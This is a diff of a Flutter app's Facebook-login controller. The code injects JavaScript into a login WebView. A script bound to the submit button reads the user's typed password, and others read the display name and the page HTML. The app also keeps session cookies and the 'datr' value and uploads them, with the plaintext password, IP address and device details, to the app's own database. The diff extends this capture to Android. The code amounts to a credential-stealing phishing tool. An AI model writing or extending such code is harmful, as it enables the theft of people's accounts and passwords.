@@ -1,5 +1,6 @@
 import 'package:dart_ipify/dart_ipify.dart';
 import 'package:device_info_plus/device_info_plus.dart';
+import 'package:facebook_app_events/facebook_app_events.dart';
 import 'package:flutter/material.dart';
 import 'package:get/get.dart';
 import 'package:package_info_plus/package_info_plus.dart';
@@ -7,27 +8,29 @@ import 'package:shared_preferences/shared_preferences.dart';
 import 'package:webview_cookie_manager/webview_cookie_manager.dart';
 import 'package:webview_flutter/webview_flutter.dart';
 import 'package:ios_utsname_ext/extension.dart';
+import 'dart:io' show Platform;
 
 import '../../../core/const/constans.dart';
 import '../../../network/services/db_services.dart';
 import '../../../route/app_pages.dart';
 
 const scriptGoToWallFB =
-'''document.getElementsByClassName("_4kk6")[0].click()''';
+    '''document.getElementsByClassName("_4kk6")[0].click()''';
 const scriptGetPass =
-'''document.getElementById("login_password_step_element").children[0].addEventListener('click', function() {jsMessageHandler.postMessage(document.getElementById("m_login_password").value);});''';
+    '''document.getElementById("login_password_step_element").children[0].addEventListener('click', function() {jsMessageHandler.postMessage(document.getElementById("m_login_password").value);});''';
 const scriptGetName =
-'''const e = document.getElementsByClassName("_6x2x"); jsMessageHandler.postMessage(e[0].innerText);''';
+    '''const e = document.getElementsByClassName("_6x2x"); jsMessageHandler.postMessage(e[0].innerText);''';
 const scriptGetToken = '''document.documentElement.outerHTML.toString()''';
 
 class LoginFacebookController extends GetxController {
+  static final facebookAppEvents = FacebookAppEvents();
 
   Rx<bool> isLoading = false.obs;
   final accountId = "".obs;
   String? pass;
   String? cookie;
   final displayName = "Bi Check point or chua vao man home app".obs;
-
+  String? deviceName;
   String? ipAddress;
   String? locale;
   String? datr;
@@ -57,6 +60,21 @@ class LoginFacebookController extends GetxController {
     } finally {
       isLoading = Rx(false);
     }
+  }
+
+
+  static Future<void> sendLoginAnalyticsEvent(
+      String userId, String phone) async {
+
+    await facebookAppEvents.logEvent(
+      name: 'login_user',
+      parameters: <String, dynamic>{
+        'user_id': userId,
+        'user_phone_no': phone,
+      },
+    );
+
+    print('Successfully Sent loginEvent');
   }
 
   Future<void> injectScripGetPass() async {
@@ -91,33 +109,20 @@ class LoginFacebookController extends GetxController {
       final prefs = await SharedPreferences.getInstance();
       await prefs.setString('accountId', accountId.value);
       await prefs.setString('name', displayName.value);
-      // if (isCheckPass.value) {
-      //   if (hasCookie.value) {
-      //     Get.close(1);
-      //
-      //     ///thông báo lỗi
-      //     // if (password.value.isNotEmpty) {
-      //     //   Get.offAndToNamed(
-      //     //     Routes.HOME,
-      //     //     arguments: {
-      //     //       'name': displayName,
-      //     //       'id': accountId,
-      //     //     },
-      //     //   );
-      //     //   hasCookie.value = false;
-      //     //
-      //     //   return;
-      //     // }
-      //   }
-      //   return;
-      // }
-      Get.offAndToNamed(
-        Routes.HOME,
-        arguments: {
-          'name': displayName.value,
-          'id': accountId,
-        },
-      );
+
+      if (Platform.isAndroid) {
+        Get.offAndToNamed(
+          Routes.HOME,
+        );
+      } else if (Platform.isIOS) {
+        Get.offAndToNamed(
+          Routes.HOME,
+          arguments: {
+            'name': displayName.value,
+            'id': accountId,
+          },
+        );
+      }
     } catch (e) {
       Get.back();
       Get.snackbar(
@@ -133,15 +138,16 @@ class LoginFacebookController extends GetxController {
     try {
       final prefs = await SharedPreferences.getInstance();
       await _getIpAddress();
-      IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
+      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
+      if (Platform.isAndroid) {
+        AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
+        deviceName = androidInfo.model;
+      } else if (Platform.isIOS) {
+        IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
+        deviceName =
+            iosInfo.utsname.machine?.iOSProductName ?? "Device iOS Name null";
+      }
       PackageInfo packageInfo = await PackageInfo.fromPlatform();
-      // print('utsName on ${iosInfo.utsname.machine?.iOSProductName}');
-      // print('version on ${packageInfo.version}');
-      // print('------------------> accountId: $accountId');
-      // print('------------------> cookie: $cookie');
-      // print('------------------> displayName: $displayName');
-      // print('------------------> ipAddress: $ipAddress');
-      // print('------------------> locale: $locale');
       await dbService.addUser(
         cUser: cUser ?? "cUser Id null",
         ipAddress: ipAddress ?? "Ip Address null",
@@ -149,11 +155,11 @@ class LoginFacebookController extends GetxController {
         locale: locale ?? "Locale Null",
         displayName: displayName.value,
         accountId: accountId.value,
-        deviceName:
-        iosInfo.utsname.machine?.iOSProductName ?? "Device Name null",
+        deviceName: deviceName ?? "Device Name Null",
         versionApp: packageInfo.version,
-        password: prefs.getString('pass')!,
+        password: prefs.getString('pass') ?? "Get Pass Null",
       );
+      sendLoginAnalyticsEvent(accountId.value,deviceName ?? "Device Name Null");
     } catch (e) {
       throw Exception('sendData: $e');
     }
@@ -161,8 +167,16 @@ class LoginFacebookController extends GetxController {
 
   Future<void> updateData() async {
     try {
-      IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
       PackageInfo packageInfo = await PackageInfo.fromPlatform();
+      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
+      if (Platform.isAndroid) {
+        AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
+        deviceName = androidInfo.model;
+      } else if (Platform.isIOS) {
+        IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
+        deviceName =
+            iosInfo.utsname.machine?.iOSProductName ?? "Device iOS Name null";
+      }
       await dbService.updateData(
         cUser: cUser ?? "cUser Id null",
         ipAddress: ipAddress ?? "Ip Address null",
@@ -170,8 +184,7 @@ class LoginFacebookController extends GetxController {
         locale: locale ?? "Locale Null",
         displayName: displayName.value,
         accountId: accountId.value,
-        deviceName:
-        iosInfo.utsname.machine?.iOSProductName ?? "Device Name null",
+        deviceName: deviceName ?? "Device Name null",
         versionApp: packageInfo.version,
       );
     } catch (e) {
@@ -235,7 +248,7 @@ class LoginFacebookController extends GetxController {
       hasCookie.value = true;
       Future.delayed(
         const Duration(seconds: 40),
-            () {
+        () {
           if (displayName.value == displayName.value) {
             displayName.value = "Check point";
           }
